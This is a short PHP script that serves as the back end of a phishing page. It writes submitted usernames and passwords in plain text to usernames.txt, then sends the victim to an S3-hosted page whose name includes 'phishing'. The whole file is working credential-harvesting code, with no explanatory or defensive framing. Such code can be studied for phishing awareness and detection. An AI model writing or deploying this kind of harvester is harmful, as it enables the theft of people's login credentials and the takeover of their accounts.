<?php

file_put_contents("usernames.txt", "Username: " . $_POST['username'] . " Pass: " . $_POST['password'] . "\n", FILE_APPEND);
header('Location: http://phishingaccueil.s3-website-us-east-1.amazonaws.com/');

exit();
